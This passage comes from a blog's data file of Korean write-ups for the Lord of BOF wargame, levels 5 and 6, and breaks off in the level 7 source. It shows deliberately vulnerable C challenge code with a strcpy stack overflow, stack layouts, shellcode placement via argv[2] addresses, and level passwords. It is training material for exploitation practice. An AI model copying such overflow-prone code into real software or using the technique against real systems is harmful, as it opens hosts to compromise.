\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// buffer hunter</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure</p>\n<p>| i[4] |\r\n| buffer[40] |\r\n| Stack Frame Pointer |\r\n| Return Address |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>environ을 memset시키는 부분이 있다. 환경변수를 이용한 공격은 할 수 없다. 공격을 위한 조건은 이전의 문제와 같으니 같은 방법으로 풀이해 보았다. argv[1]에 48바이트를 채우고, argv[2]에 100바이트를 채운 후 그 주소값을 확인하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 640px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAt0lEQVR42k2Qi27DMAhF8Ut2jFMcnGLTddn6/z85Je6kHiR0kXhcAa/Xr8h96GBmIqq1xhidc9bamaeYwAcxRvh6Ps/h0aULEQ0drfHeWq1VVW+3dd9brcTbGaVgSiljzstSCgIRretaSokx+n+C959njTH2XVhjjHPeWptSAlUVkXrBvCFmxLykxXtvLgBgzk63c8nb9nEc3z/HxhxCUB36eCAiANyvR5zeLt1HR8wARrrMnhDCH5JoDJg8QBIZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/8b4034f66a32c34bf72fb280f19f9f89/c9b55/0.webp 165w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/f2908/0.webp 330w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/0ba47/0.webp 640w\"\n              sizes=\"(max-width: 640px) 100vw, 640px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/8b4034f66a32c34bf72fb280f19f9f89/04c57/0.png 165w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/d9ecf/0.png 330w,\n/static/8b4034f66a32c34bf72fb280f19f9f89/6af66/0.png 640w\"\n            sizes=\"(max-width: 640px) 100vw, 640px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/8b4034f66a32c34bf72fb280f19f9f89/6af66/0.png\"\n            alt=\"disas\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.54545454545455%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABG0lEQVR42j2Q24rkMBBD9WCnA5tMbr6Vq8p2nHSz//+FS6Zh34QQ6Ei47/fn74coAaBM132XUgAs69rO1lodx9HaQUsptW7b+hvLrVUiAjNrkX3fAGz77r07jgPAn2kKMTrnjDXGWO9DCGGaJgCH8zGEbdtQamGRY98BOOeIUggBwDzPzJxiHAZrjM2ZRHhZfgDEmJjZe4/3533dN6UIIBH13krRL3a/en2wX9YOrdXr6t8OVe29Z87oV2/nGePTFmKstYgwgJ9laa2p6vgajLVatLX6oAKZ+Tzrc5OoaNHv5v3YmXNK6buZOVOm1zAYY2KK/7F98CzsnENtVVQf9bihlJIzAZjmWURYZBxfxlh+pKzr79tEquKO4x++cB/R0UlIaQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ce24373e4e31fa7c563176c8fc57f161/c9b55/1.webp 165w,\n/static/ce24373e4e31fa7c563176c8fc57f161/f2908/1.webp 330w,\n/static/ce24373e4e31fa7c563176c8fc57f161/e88ff/1.webp 600w\"\n              sizes=\"(max-width: 600px) 100vw, 600px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ce24373e4e31fa7c563176c8fc57f161/04c57/1.png 165w,\n/static/ce24373e4e31fa7c563176c8fc57f161/d9ecf/1.png 330w,\n/static/ce24373e4e31fa7c563176c8fc57f161/0a47e/1.png 600w\"\n            sizes=\"(max-width: 600px) 100vw, 600px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ce24373e4e31fa7c563176c8fc57f161/0a47e/1.png\"\n            alt=\"disas2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>argv[2]가 시작하는 주소지는 0xbffffc1c임을 알 수 있다. 이를 이용하여 다음과 같이 공격을 시도하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 643px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAtklEQVR42o3LWY6EMAxFUWeUIDYVpeIQZ4B/9r/AamADfT6sJ1kXpMlxHMxc687MOecxZ0rfOede91rrmKO11nsvpYjUMUbvvdb9ui5I6cucmbk1EZHeW855WRYi2h70cM4h4ju01gDAzPCJMWCw1jrnvPfWWu+9MUZrrd+r32m0NkopY4y1FgBSSnCeZ2tSSkHCEMLyIKIQAm3buq74CBiI6H5thIje+zsWucsYI/ybUgoA/pIfaPwOuDlNIyQAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7b9c3f8ad8696f1866bdecf7f12f63f5/c9b55/2.webp 165w,\n/static/7b9c3f8ad8696f1866bdecf7f12f63f5/f2908/2.webp 330w,\n/static/7b9c3f8ad8696f1866bdecf7f12f63f5/b1337/2.webp 643w\"\n              sizes=\"(max-width: 643px) 100vw, 643px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7b9c3f8ad8696f1866bdecf7f12f63f5/04c57/2.png 165w,\n/static/7b9c3f8ad8696f1866bdecf7f12f63f5/d9ecf/2.png 330w,\n/static/7b9c3f8ad8696f1866bdecf7f12f63f5/b5bda/2.png 643w\"\n            sizes=\"(max-width: 643px) 100vw, 643px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7b9c3f8ad8696f1866bdecf7f12f63f5/b5bda/2.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: love eyuna</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"d7d99992-ab84-5828-9789-59528dc58926","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-05/","title":"LOB 5번 (orc -> wolfman)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/1efcf0bd14780775918766f3427cd59b/ab525/0.png","srcSet":"/static/1efcf0bd14780775918766f3427cd59b/921db/0.png 161w,\n/static/1efcf0bd14780775918766f3427cd59b/b52ce/0.png 322w,\n/static/1efcf0bd14780775918766f3427cd59b/ab525/0.png 643w","sizes":"(min-width: 643px) 643px, 100vw"},"sources":[{"srcSet":"/static/1efcf0bd14780775918766f3427cd59b/e1eb6/0.webp 161w,\n/static/1efcf0bd14780775918766f3427cd59b/19c5e/0.webp 322w,\n/static/1efcf0bd14780775918766f3427cd59b/5cdbd/0.webp 643w","type":"image/webp","sizes":"(min-width: 643px) 643px, 100vw"}]},"width":660,"height":400.31104199066874}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - darkelf\r\n        - egghunter + buffer hunter + check length of argv[1]\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>environ<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// egghunter</span>\r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// check the length of argument</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argument is too long!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// buffer hunter</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| i[4] |\r\n| buffer[40] |\r\n| Stack Frame Pointer |\r\n| Return address |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>이전 문제의 조건에 argv[1]의 크기를 한정하는 조건이 추가되었다. 이전 문제들을 풀이할 때에도 argv[1]의 크기는 딱 48바이트로 맞추었으므로 같은 방식으로 문제를 풀어도 문제되지 않을 것이다. argv[1]에 48바이트를, argv[2]에 100바이트를 넣어 이들의 주소지를 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 643px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA4UlEQVR42lWPSXLEMAwDtdDUSkrUanv+/89UNLmkDyheQADqvlfrMsbIORNTjNFaa4zRWn/1izkopdVB63P03ph57UlEY84xp7QmUmOM0qTWGkIYozNTqZWIEF2IwYIFALX22vd+nnvtzcw5Z2ZOKXEpzL+SUsqU4QIA8N5dAM45a49ZRJjZB99aq7WmFKtIjDGE4JxDxBCjBVD/+av9vs9ai0vpo3MpKSUfPCJe12/W2akAABHhvLDWIqJzeMyfd8xpjUk5vZ93rgWn09pz701ESqnW29pTRJRSRPk5eUbrHzzkDootrPTEAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1efcf0bd14780775918766f3427cd59b/c9b55/0.webp 165w,\n/static/1efcf0bd14780775918766f3427cd59b/f2908/0.webp 330w,\n/static/1efcf0bd14780775918766f3427cd59b/b1337/0.webp 643w\"\n              sizes=\"(max-width: 643px) 100vw, 643px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1efcf0bd14780775918766f3427cd59b/04c57/0.png 165w,\n/static/1efcf0bd14780775918766f3427cd59b/d9ecf/0.png 330w,\n/static/1efcf0bd14780775918766f3427cd59b/b5bda/0.png 643w\"\n            sizes=\"(max-width: 643px) 100vw, 643px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1efcf0bd14780775918766f3427cd59b/b5bda/0.png\"\n            alt=\"argv addr\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>(중략)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 609px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.121212121212125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAvklEQVR42n3Q3arDIBBG0SFKgoeGWNBWnR/H2vd/xhKTHHrVuV/sj4He39o05wwAMUapktMTALz3zIRYjDHO/SESEc3zbK1FImFe1xV6f7emZeAQAmJ5Ph4AsHlPiCmlaZoG3u/EiEy03m4D95ZGLYQgQjmno1xFSsnGTM45EVaty7JYa5lFtW7btuNXb/nCqoJYTlyFztm/8KuMWgix1r12YKmC/5hZ64XlC7erHGNU1bN8v4swEh4P4+/yhT/ObhvVIE/yRwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0433ffcca40ecc7f01fb3ae1af6a3334/c9b55/1.webp 165w,\n/static/0433ffcca40ecc7f01fb3ae1af6a3334/f2908/1.webp 330w,\n/static/0433ffcca40ecc7f01fb3ae1af6a3334/117a4/1.webp 609w\"\n              sizes=\"(max-width: 609px) 100vw, 609px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0433ffcca40ecc7f01fb3ae1af6a3334/04c57/1.png 165w,\n/static/0433ffcca40ecc7f01fb3ae1af6a3334/d9ecf/1.png 330w,\n/static/0433ffcca40ecc7f01fb3ae1af6a3334/d0d8c/1.png 609w\"\n            sizes=\"(max-width: 609px) 100vw, 609px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0433ffcca40ecc7f01fb3ae1af6a3334/d0d8c/1.png\"\n            alt=\"argv addr2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>argv[2]는 0xbffffb0c부터 위치하는 것을 확인할 수 있다. 이를 바탕으로 아래와 같이 공격을 진행하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.575757575757578%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAo0lEQVR42jWO246DQAxDkSCgkDiZVluGbiE7XP7/GysYrR+sY/nBbs7jmOd537ff93uapvM8X6+fJWLfyuP5jFiXdck5l618lk8pJWKdcv6L2I+jMTMF3M3MADUAqp4SgFEE0JTca3079YQbmbkxwzAMRNS2bd/3RFS9xspE1HVdBfpvqaMmItLj2mFmqMq1BlVlZr0F2HjpeiEi5iYiPI7u/gU7NA3+KXswxQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0e3cd286f0675947f7599a52d522fc31/c9b55/2.webp 165w,\n/static/0e3cd286f0675947f7599a52d522fc31/f2908/2.webp 330w,\n/static/0e3cd286f0675947f7599a52d522fc31/d95e5/2.webp 639w\"\n              sizes=\"(max-width: 639px) 100vw, 639px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0e3cd286f0675947f7599a52d522fc31/04c57/2.png 165w,\n/static/0e3cd286f0675947f7599a52d522fc31/d9ecf/2.png 330w,\n/static/0e3cd286f0675947f7599a52d522fc31/738b8/2.png 639w\"\n            sizes=\"(max-width: 639px) 100vw, 639px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0e3cd286f0675947f7599a52d522fc31/738b8/2.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 115px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.869565217391305%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABa0lEQVR42j1O63KaQBQ+exZMDGPQClbAuOByFZZLElEEgZjUmU7f/306SNPv33c9B8IwWv5Y6ppuWlvP9yzLikMPANamZZmGpunPs5mm65qu6fpqtfq5NkzDMGDE5+1X29+6S9t1bdM2VXUs0j0AnNr+9tVXx8NCfT5d6qo+dx8fdX2u26ZpzgBACAGklABBpIgEESVJooij9zBVNG0JAOpcVZ6md5cOwXtgQJIVrh8wtrU3a+4GO86A0OOpUpXJ45OaZWkURSLPfdcZFv/XRqT5axQn5XuexKEQ6W7HAGC+WEg4XBZCcL7biywK3PGdb9zLiEjIoFJESvGuElmWx+nv1D8iy5ORS7JMKcLt95/++pln6V7Exduhrsq8eI2TeEJAUZdJKoTYi7w4HMpzfemufVme3t6P12trWGvww9jzvM3Gsh1ny+zAd03T5C5/lOnDVGHMdmzGHMcPAu5xh3PXczcvL77vzeezvxyrLuxqaUGaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4abe788c5f47a21450b072108865c3fa/72348/3.webp 115w\"\n              sizes=\"(max-width: 115px) 100vw, 115px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4abe788c5f47a21450b072108865c3fa/e907b/3.png 115w\"\n            sizes=\"(max-width: 115px) 100vw, 115px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4abe788c5f47a21450b072108865c3fa/e907b/3.png\"\n            alt=\"my-pass\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: kernel crashed</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"ebfd2ce8-aa25-54ae-9fa4-35f2cdfac8fb","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-06/","title":"LOB 6번 (wolfman -> darkelf)","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/5f8d073b661ad43d0790a82d54865a2b/51b64/0.png","srcSet":"/static/5f8d073b661ad43d0790a82d54865a2b/c02c1/0.png 160w,\n/static/5f8d073b661ad43d0790a82d54865a2b/6c845/0.png 320w,\n/static/5f8d073b661ad43d0790a82d54865a2b/51b64/0.png 640w","sizes":"(min-width: 640px) 640px, 100vw"},"sources":[{"srcSet":"/static/5f8d073b661ad43d0790a82d54865a2b/4d75c/0.webp 160w,\n/static/5f8d073b661ad43d0790a82d54865a2b/0166a/0.webp 320w,\n/static/5f8d073b661ad43d0790a82d54865a2b/e3b90/0.webp 640w","type":"image/webp","sizes":"(min-width: 640px) 640px, 100vw"}]},"width":660,"height":400.125}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">﻿<span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - orge\r\n        - check argv[0]\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n\r\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>environ<span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// here is changed!</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">77</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv[0] error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// egghunter</span>\r\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'\\xbf'</span><span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"stack is still your friend.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// check the length of argument</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argument is too long!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span 